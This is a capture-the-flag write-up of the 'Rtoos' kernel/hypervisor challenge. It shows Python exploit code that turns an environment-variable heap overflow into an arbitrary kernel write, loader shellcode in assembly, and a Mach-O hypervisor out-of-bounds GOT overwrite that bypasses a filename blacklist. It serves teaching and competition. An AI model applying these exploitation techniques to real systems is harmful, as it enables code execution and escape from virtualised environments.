# Rtoos

The challenge gives you a kernel image `crux` and a remote address you can connect to. Reversing the kernel gave us some information about the environment. 

```
(1) There is a hypervisor running this kernel called `honcho` and it is located in the current directory.
(2) You can read files by using the `cat` command.
(3) You can do `ls` on the current directory.
(4) You can set environment variables.
(5) You can't read `honcho` and `flag` because they are blacklist filtered by the kernel and hypervisor respectively.
(6) All other files can be read, such as `/etc/passwd`
```

It was obvious that I had to read `honcho` and to do that I needed arbitrary kernel code execution.

## Part.1 Exploiting the kernel

The vuln is very easy. It exists in the environment variable settings. You can either `export` and environment variable or `unset` one. You can also view all environment variables by using `env` command.

unset: free's the `env_value[idx]` and sets the first byte of `env_key` to 0.
```
 for ( j = 0; j < 16; ++j )
  {
    if ( strlen(env_key[j]) && !strcmp(env_key[j], &cmdline[6]) )
    {
      env_key[j][0] = 0;
      free(env_value[j]); 
      return 0;
    }
  }  
```

export:
```
/* if env with key already exists */
for (i = 0; i < 16; i++) {
	if (strlen(env_key[i]) && !strcmp(env_key[i],key)) {
		/* modifiy env_key[i] */
	}
}

for (i = 0; i < 16; i++) {
	if (!strlen(env_key[i])) {
		env_val[i] = malloc (512-strlen(key)-len("export ")+1);
		/* modify env_val */
	}
}
```

There is a straightforward problem with how env_val's are allocated. Even if env_val's length is modified a new buffer for it is not allocated resulting in a heap overflow. But each commandline is restricted to 0x1FF bytes so we use the $ notation to exploit this. Simply,

```
export 1=AAAA
export 2=BBBB$1
```

will result in 2 becoming BBBBAAAA, which is unlmited string concatenation. The env_val array is slightly higher than the heap bucket so a heap overflow may overwrite the env_val pointer array. Also, if we modify an env_val pointer array we get arbitrary write in the kernel. Setting the value of an environment variable corresponding to the overwritten pointer will write that value to the overwritten pointer. So I heuristically adjusted the overflow length so that env_val[0] is overwritten to the exact value we want and got a write primitive.

```
for i in range(1,6):
        export(str(i),"a"*0x1E0+"\x00")

addr = 0x880 #check function
export(str(6),"\xC0"*0x1E0+p16(where)+"\x00") #overwrite pointer of 1
export("7","1"*0x1a2+"$6")
export("1",what)
```

The code above gives us a write what where primitive because the env_val pointer of the vairable with key "1" is overwritten to `where`. I overwrote the check function that blocks us from reading the hypervisor and changed it to `xor rax,rax ret` and read the hypervisor. Also for the next stage I wrote a loader shellcode which reads more shellcode from stdin and executes it. This is quite important because you cannot set env_val with strings with nulls in the middle and the length is restricted to a small value.

```
xor rdi,rdi 
mov di,0x13F0
mov rax,rdi
mov r15,rdi

xor rdx,rdx
mov dl,0x63
mov rdi,rdx

xor rsi,rsi
mov si, 0x300

out dx,al
call r15
jmp $
```

## Hypervisor
The hypervisor was a Mach-O binary with PIE enabled. After some reversing I found out a few things.

```
(1) The string "flag" is blacklisted for filenames when handling `hypercall_cat`
(2) The `hypercall_read` and `hypercall_puts` has an OOB vulnerability where you can read and write any memory located at a relative offset to `vm_mem`. With good leaks we can access (read/write) all memory of the hypervisor (host) and get RCE.
(3) By overwriting `strcasestr_ptr` to `atoi_ptr` we can bypass the blacklist check for `hypercall_cat`.
```

In case you have never seen kernel-hypervisor challenges before here's a simple explanation.

```
(1) The hypervisor reads the kernel file, loads it onto memory and 'virutally' executes it.
(2) The physical memory of the kernel is actually a userspace memory of the hypervisor. In other words user pages are used to virtualize RAM. They can be allocated either by `mmap`, `malloc` or `valloc`. In this case `vm_mem` is the virtual-RAM.
```

I tried to find some good leaks but failed. After some time my teammate solved this challenge and I took a look at his exploit figuring out how he did it. It turns out that memory allocated by `valloc` has a fixed offset to the PIE base and therefore we can access the `_la_symbols_ptr` of the hypervisor (The GOT equivalent in Mach-O binaries) and overwrite `starcasestr_ptr` to `atoi_ptr`. So the steps are:

```
(1) Read `atoi_ptr` and get the library function address of `atoi`.
(2) Overwrite `starcasestr_ptr` with what we got in (1)
```